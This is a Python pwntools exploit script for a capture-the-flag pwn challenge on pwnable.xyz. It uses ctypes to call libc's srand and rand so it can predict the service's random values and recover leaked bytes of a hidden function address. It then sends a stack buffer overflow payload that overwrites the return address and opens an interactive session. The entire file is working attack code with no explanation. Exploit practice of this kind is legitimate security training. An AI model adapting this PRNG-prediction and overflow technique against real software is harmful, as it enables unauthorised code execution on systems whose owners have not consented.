from pwn import *
import ctypes

LIBC = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')



def encrypt(text):
        sh.sendlineafter('> ', '2')
        sh.sendlineafter(': ', text)



def reload_rand(times):
        for i in range(0, times):
            LIBC.rand()
            encrypt("\x01")


def take_byte():
    encrypt('\x01')
    sh.sendlineafter('> ', '3')
    sh.recvuntil('ciphertext: ')
    byte = u8(sh.recvline()[0:1]) - 0x1
    return byte

#sh = process('./challenge')
sh = remote('svc.pwnable.xyz', 30040)
times = 2

rvalues = []
rvalues2 = []
rvalues3 = []

rvalues4 = []
#out[0] = 0xd6


place = LIBC.rand() & 0x7
print "place = ", place


for i in range(0, 255):
    LIBC.srand(i)
    rvalues.append(LIBC.rand()&0xff)
    rvalues2.append(LIBC.rand()&0xff)
    rvalues3.append(LIBC.rand()&0xff)
    rvalues4.append(LIBC.rand()&0xff) 
    
out = [0 for i in range(8)]
check = [0 for i in range(8)]
count = 0
sol = 0
check[0] = 1
check[6] = 1
check[7] = 1
while(count < 5):

    sh.sendlineafter('> ', '1')
    byte = take_byte()
    byte2 = take_byte()
    byte3 = take_byte()
    byte4 = take_byte()
    for i in range(0, 255):
        if byte == rvalues[i] and byte2 == rvalues2[i] and byte3 == rvalues3[i] and byte4 == rvalues4[i]:
            print "i = ", hex(i)
            sol = i
            break

    LIBC.srand(i)
    for i in range(0, 4):
        LIBC.rand()
    if check[place] == 0:
        count += 1
        out[place] = sol
        check[place] = 1
    if count == 5: break
    print "in place ", hex(place)

    place = LIBC.rand() & 0x7
    print "new place = ", place
    while (check[place] == 1):
        encrypt('\x01')
        reload_rand(times)
        times = (times + 1)
        place = LIBC.rand() & 0x7



out[0] = 0xd6
print out
win_addr = 0

for i in range(0, 7):
    win_addr += out[7-i]
    win_addr <<= 8

win_addr += 0xd6


print hex(win_addr)


final = (LIBC.rand()) & 0xff

print "final = ", hex(final)

for i in range(0, 8):
    if final > out[i]:
        out[i] = 0xff - final + 1 + out[i]
    else:
        out[i] = out[i] - final


win_addr = 0
for i in range(0, 7):
    win_addr += out[7-i]
    win_addr <<= 8

win_addr += out[0]
encrypt("A"*0x90 + "B"*0x8 + p64(win_addr))
sh.interactive()

    


